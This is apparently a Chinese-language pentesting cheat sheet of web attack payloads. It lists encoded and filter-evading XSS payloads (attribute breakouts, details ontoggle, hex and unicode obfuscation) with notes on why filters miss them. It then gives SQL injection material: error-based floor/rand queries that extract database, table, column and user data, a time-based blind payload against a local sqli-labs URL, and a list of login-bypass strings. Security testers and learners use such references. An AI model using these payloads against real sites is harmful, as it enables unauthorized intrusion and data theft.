# xss/sql注入语句



---

1、有效和重要的xss语句：
--------------

  1、  "onfocus="alert(1)"autofocus="
  变形：

    'onfocus='alert&#40;1&#41;'autofocus='
    &#34;onfocus=&#34;alert(1)&#34;autofocus=&#34;
这种payload还是有可能成功的，xss测试时推荐先使用，原因为大部分input标签结构为：

    <input id="searchBox" name="q" placeholder="搜索问题或关键字" class="form-control" value="" type="text">
当输入此payload时可以闭合引号，实现js的执行。
    
    
    
2、`<marquee style="background-color:red" onstart="alert('xss')">text</marquee>`
字幕标签，很有可能没被过滤。
    
    
    
3、`<img src=# onerror=&#101;&#118;&#97;&#108;("\x61\x6c\x65\x72\x74\x28\x2fxss/)")>`
原型很简单，此处使用16进制编码alert，自然条件下即可执行。
接下来推荐一个我见过最强大的编码和解码的工具：
![此处输入图片的描述][1]

[工具链接][2]

4、`<details ontoggle=alert(1)>`
变形为：`<details open="" ontoggle=alert(/xss/)>`
还可以使用unicode编码进行变形：
`<details ontoggle="aler\u0074(1)">` 

非常有效的xss语句，标签和事件很有可能都没被过滤，变形效果更好，无需点击即可触发。
    
5、`<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">`
没有敏感标签，需要右键点击触发。

6、`<iframe src=x onmouseover=alert(1)></iframe>`
和`<a src=x onmouseover=alert(1)>aaa</a>`
iframe标签偶尔不过滤，a标签经常不过滤，这两个payload就显得有用了。





2、有效和重要的sql语句：
--------------
###1、盲注常用函数###

***1、mid()---从文本字段中提取字符***

    SELECT MID(column_name,start[,length]) FROM table_name;

column_name 必需。要提取字符的字段。

start 必需。规定开始位置（起始值是 1）。

length 可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。

***2、limit()---返回前几条或者中间某几行数据***

    select * from table limit m,n;

其m指记录始index0始表示第条记录 n指第m+1条始取n条

***3、concat、concat_ws、group_concat---连接字符串***

根据返回值来判断有无此字符串。

***4、rand()---用于产生一个0~1的随机数***
***5、group by---依据我们想要的规则对结果进行分组***
***6、floor()---向下取整***
***7、Substr()---截取字符串 三个参数 （所要截取字符串，截取的位置，截取的长度）***
***8、Ascii()---返回字符串的ascii码***
###2、报错注入（floor报错）###

    select count(*),(concat(0x3a,database(),0x3a,floor(rand()*2))) name from information_schema.tables group by name; --获取数据库
    select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x3a,floor(rand()*2)) name from information_schema.tables group by name;--获取表
    select count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x3a,floor(rand()*2)) name from information_schema.tables group by name;--获取字段名
    select count(*),concat(0x3a,0x3a,(select username from users limit 0,1),0x3a,floor(rand()*2)) name from information_schema.tables group by name;--获取内容

###3、基于布尔盲注###
通过构造sql语句，通过判断语句是否执行成功来对数据进行猜解。

    select table_name from information_schema.tables where table_schema=database() limit 0,1;--获取表名第一个字符

###4、基于时间盲注###
基于的原理是，当对数据库进行查询操作，如果查询的条件不存在，语句执行的时间便是0.但往往语句执行的速度非常快，线程信息一闪而过，得到的执行时间基本为0。但是如果查询语句的条件不存在，执行的时间便是0，利用该函数这样一个特殊的性质，可以利用时间延迟来判断我们查询的是否存在。

    payload = "http://127.0.0.1/sqli-labs/Less-8/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{0},1))>{1},0,sleep(5)) %23"--获取表名
###5、常用测试语句###
'='
"="
    1： "or "a"="a
   2： ')or('a'='a
   3：or 1=1--
   4：'or 1=1--
   5：a'or' 1=1--
   6： "or 1=1--
   7：'or'a'='a
   8： "or"="a'='a
   9：'or''='
   10：'or'='or'
   11: 1 or '1'='1'=1
   12: 1 or '1'='1' or 1=1
   13: 'OR 1=1%00
   14: "or 1=1%00
   15: 'xor
  [1]: http://www.xfcxc.top/Adgainai4/xsstool.png
  [2]: http://evilcos.me/lab/xssee/